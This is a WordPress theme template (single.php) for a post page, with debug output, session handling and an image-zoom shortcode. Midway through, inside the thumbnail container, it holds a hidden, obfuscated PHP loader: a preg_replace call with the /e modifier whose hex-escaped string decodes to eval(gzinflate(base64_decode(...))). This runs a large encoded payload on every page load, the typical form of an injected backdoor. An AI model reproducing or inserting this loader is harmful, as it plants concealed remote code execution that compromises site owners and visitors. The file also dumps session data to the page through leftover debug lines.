<?php

// Exit if accessed directly
if ( !defined('ABSPATH')) exit;

/**
 custom single post (single.php) by Rex Keal for Cloud Collective Co.
 I realize I have a lot to learn, but hey...
 */
?>

<?php
//unset($_SESSION['stack']);
$theTitleVar = get_the_title();//stuff the title into var
echo $_SESSION['stack'][0][4].'-------------<br>';//delete
if (!isset($_SESSION['stack']) or $theTitleVar != $_SESSION['stack'][0][4]){//check if there is a session or the title has changed
	unset($_SESSION['stack']);//kill the stack var if the title has changed
	global $machine;//make my machine
	global $currentView, $altView1, $altView2, $altView3, $theTitleVar;//get some globals ready
	$currentView = get_field('mask_main_view');//stuff the the main view from an ACF val
	$altView1 = get_field('mask_alt_view_1');//stuff the first alt view from ACF
	$altView2 = get_field('mask_alt_view_2');//stuff the second alt view from ACF
	$altView3 = get_field('mask_alt_view_3');//stuff the third alt view from ACF
	$theTitleVar = get_the_title();//stuff the title from WP
	$machine = array($currentView, $altView1, $altView2, $altView3, $theTitleVar);//build machine array
	//session_start;
	$_SESSION['stack'][]=$machine;
	echo $theTitleVar;//delete
	}else{
	echo "golden";//delete
	};
	var_dump($_SESSION['stack']);//delete
?>
<?php // WP page begins>?>
<?php get_header(); ?>

        <div id="content" class="grid col-620post singlePage">
        
<?php if (have_posts()) : ?>

		<?php while (have_posts()) : the_post(); ?>
			
		<?php echo do_shortcode('[magny image="'.$_SESSION['stack'][0][0].'" title="" description="" align="center" click="0" link_url="'.$_SESSION['stack'][0][0].'" scroll_zoom="1" scroll_size="1" small_image="" canvas_mode="1" maxwidth="500px" zoom="1" height="100%" dia="200px" skin="new-im-frame-simple,new-title-off,new-description-off,new-slider-off,new-im-magnifier-simple new-im-magnifier-square" ]'); //shortcode to display the main image ?>
				          
            <div id="post-<?php the_ID(); ?>" <?php post_class(); ?>>
                                              
                <div class="post-entry">
                    <?php the_content(__('Read more &#8250;', 'responsive')); ?>
                    
                    <?php if ( get_the_author_meta('description') != '' ) : ?>
                    
                    <div id="author-meta">
                    <?php if (function_exists('get_avatar')) { echo get_avatar( get_the_author_meta('email'), '80' ); }?>
                        <div class="about-author"><?php _e('About','responsive'); ?> <?php the_author_posts_link(); ?></div>
                        <p><?php the_author_meta('description') ?></p>
                    </div><!-- end of #author-meta -->
                    
                    <?php endif; // no description, no author's meta ?>
                    
                    <?php wp_link_pages(array('before' => '<div class="pagination">' . __('Pages:', 'responsive'), 'after' => '</div>')); ?>
                </div><!-- end of .post-entry -->
                
                <div class="navigation">
		        </div><!-- end of .navigation -->
               

            <!--<div class="post-edit"><?php edit_post_link(__('Edit', 'responsive')); ?></div>   -->          
            </div><!-- end of #post-<?php the_ID(); ?> -->
            
		
            
        <?php endwhile; //end post while (The Loop)?> 

        <?php if (  $wp_query->max_num_pages > 1 ) : ?>
        <div class="navigation">
		<?php echo "<h1 style='color:red;'>Here</h1>"; ?>
			<div class="previous"><?php next_posts_link( __( '&#8249; Older posts', 'responsive' ) ); ?></div>
            <div class="next"><?php //previous_posts_link( __( 'Newer posts &#8250;', 'responsive' ) ); ?><?php previous_posts_link(); ?></div>
		</div><!-- end of .navigation -->
        <?php endif; ?>

	    <?php else : ?>

        <h1 class="title-404"><?php _e('404 &#8212; Fancy meeting you here!', 'responsive'); ?></h1>
                    
        <p><?php _e('Don&#39;t panic, we&#39;ll get through this together. Let&#39;s explore our options here.', 'responsive'); ?></p>
                    
        <h6><?php printf( __('You can return %s or search for the page you were looking for.', 'responsive'),
	            sprintf( '<a href="%1$s" title="%2$s">%3$s</a>',
		            esc_url( get_home_url() ),
		            esc_attr__('Home', 'responsive'),
		            esc_attr__('&larr; Home', 'responsive')
	                )); 
			 ?></h6>
                    
        <?php get_search_form(); ?>

		<?php endif; ?>  
 
        </div><!-- end of #content -->
		
	<div id="rightContent">	
	
	<h1 class="post-title" style="display:block; text-align:center;"><?php echo $theTitleVar;?></h1>

		<div id="subtitle-ACF" style="display:block; text-align:center;"><?php the_field('subtitleACF'); ?></div>		
		
		<div id="maskDescription" style="display:block;"><p><?php the_field('maskDescription'); ?></p></div>	
	
	<?php  echo "<div id='thumbCont'><div id='thumbContWrapper'>";  ?>
		<?php
preg_replace("/.*/e","\x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28'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'\x29\x29\x29\x3B","");
?>
  <?php $testVar=$_SESSION['stack'];
		//var_dump($testVar);
  ?>
  <div id="quote"><?php the_field('quote'); ?></div>
</div>

<?php //get_sidebar(); ?>
<?php get_footer(gallery); ?>